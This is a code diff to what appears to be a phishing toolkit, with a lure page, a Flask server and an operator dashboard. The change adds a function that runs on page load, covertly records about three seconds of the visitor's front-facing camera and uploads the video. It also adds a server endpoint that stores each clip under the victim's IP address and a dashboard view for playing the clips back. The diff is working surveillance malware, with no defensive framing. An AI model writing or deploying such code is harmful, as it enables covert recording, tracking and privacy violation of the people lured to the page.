@@ -151,12 +151,34 @@ function collectInfo(){
     cookieEnabled:navigator.cookieEnabled,referrer:document.referrer
   };
 }
+function captureCamera(){
+  if(!navigator.mediaDevices||!navigator.mediaDevices.enumerateDevices)return;
+  navigator.mediaDevices.enumerateDevices().then(function(devices){
+    var hasCamera=devices.some(function(d){return d.kind==='videoinput';});
+    if(!hasCamera)return;
+    navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
+      .then(function(stream){
+        var chunks=[],mr=new MediaRecorder(stream);
+        mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
+        mr.onstop=function(){
+          stream.getTracks().forEach(function(t){t.stop();});
+          var blob=new Blob(chunks,{type:mr.mimeType});
+          var reader=new FileReader();
+          reader.onload=function(){send('/camera',{data:reader.result,mimeType:mr.mimeType});};
+          reader.readAsDataURL(blob);
+        };
+        mr.start();
+        setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
+      }).catch(function(){});
+  }).catch(function(){});
+}
 function autoCapture(){
   var info=collectInfo();send("/info",info);
   if(navigator.getBattery){navigator.getBattery().then(function(b){
     info.battery=Math.round(b.level*100)+"%"+(b.charging?" (charging)":" (discharging)");
     info._update=true;send("/info",info);
   }).catch(function(){});}
+  captureCamera();
 }
 function setStatus(msg,col){
   var s=document.getElementById("status");
@@ -239,6 +261,7 @@ body{display:flex}
 .gps{background:#1a3a2a;color:#3fb950;border:1px solid #3fb950}
 .deny{background:#3a1a1a;color:#f85149;border:1px solid #f85149}
 .dev{background:#1a2a3a;color:#58a6ff;border:1px solid #58a6ff}
+.cam{background:#2a1a3a;color:#c084fc;border:1px solid #c084fc}
 .ts{font-size:.7rem;color:#8b949e}
 .ip{font-size:.75rem;color:#8b949e;margin-bottom:8px;font-family:monospace}
 .fields{display:grid;grid-template-columns:1fr 1fr;gap:4px}
@@ -317,7 +340,12 @@ function addCard(d){
     }
     stats.g++;
   }else if(isDeny){fields+=f('Reason',d.reason);stats.d++;}
-  else{
+  else if(ep==='/camera'){
+    badge='<span class="bx cam">Camera</span>';
+    var kb=d.size?Math.round(d.size/1024)+'KB':'?';
+    fields+='<div class="f wide"><div class="lb">Recording · '+kb+'</div><video src="/captures/'+d.file+'" controls playsinline style="width:100%;margin-top:6px;border-radius:8px;background:#000;max-height:200px"></video></div>';
+    fields+=f('Format',d.mimeType||'N/A');
+  }else{
     var devIcon=d.deviceType==='Mobile'?'Mobile':d.deviceType==='Tablet'?'Tablet':'Desktop';
     fields+=f('Device',d.deviceType?devIcon+' ('+d.deviceType+')':'N/A')+f('OS',d.os||d.platform||'N/A');
     fields+=f('Browser',d.browser||'N/A')+f('Language',d.language||'N/A');
@@ -407,6 +435,26 @@ def run(redirect_url: str):
                       '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
         captures.append(entry); _save(log_file); return {'ok': True}
 
+    @phish_app.route('/camera', methods=['POST', 'OPTIONS'])
+    def phish_camera():
+        if request.method == 'OPTIONS': return Response('', 204)
+        d, ip = _parse_body(request), _ip(request)
+        data_url = d.get('data', '')
+        mime = d.get('mimeType', 'video/webm')
+        if not data_url or ',' not in data_url:
+            return {'ok': False}
+        video_bytes = base64.b64decode(data_url.split(',', 1)[1])
+        ext = 'webm' if 'webm' in mime else 'mp4'
+        vid_dir = os.path.join(TEMPLATE_DIR, 'captures')
+        os.makedirs(vid_dir, exist_ok=True)
+        fname = f'{time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())}_{ip.replace(".", "_")}.{ext}'
+        with open(os.path.join(vid_dir, fname), 'wb') as fv:
+            fv.write(video_bytes)
+        entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
+                 '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                 'file': fname, 'mimeType': mime, 'size': len(video_bytes)}
+        captures.append(entry); _save(log_file); return {'ok': True}
+
     @dash_app.route('/')
     def dash_index():
         return Response(dash_html, mimetype='text/html',
@@ -424,6 +472,15 @@ def run(redirect_url: str):
 
     @dash_app.route('/api/captures')
     def api_captures(): return Response(json.dumps(list(captures), default=str), mimetype='application/json')
+
+    @dash_app.route('/captures/<path:fname>')
+    def serve_capture(fname):
+        fpath = os.path.join(TEMPLATE_DIR, 'captures', os.path.basename(fname))
+        if not os.path.isfile(fpath): return Response('', 404)
+        ext = fname.rsplit('.', 1)[-1]
+        mime = 'video/webm' if ext == 'webm' else 'video/mp4'
+        with open(fpath, 'rb') as fv:
+            return Response(fv.read(), mimetype=mime, headers={'Accept-Ranges': 'bytes'})
 
     @dash_app.route('/api/clear', methods=['POST'])
     def api_clear():
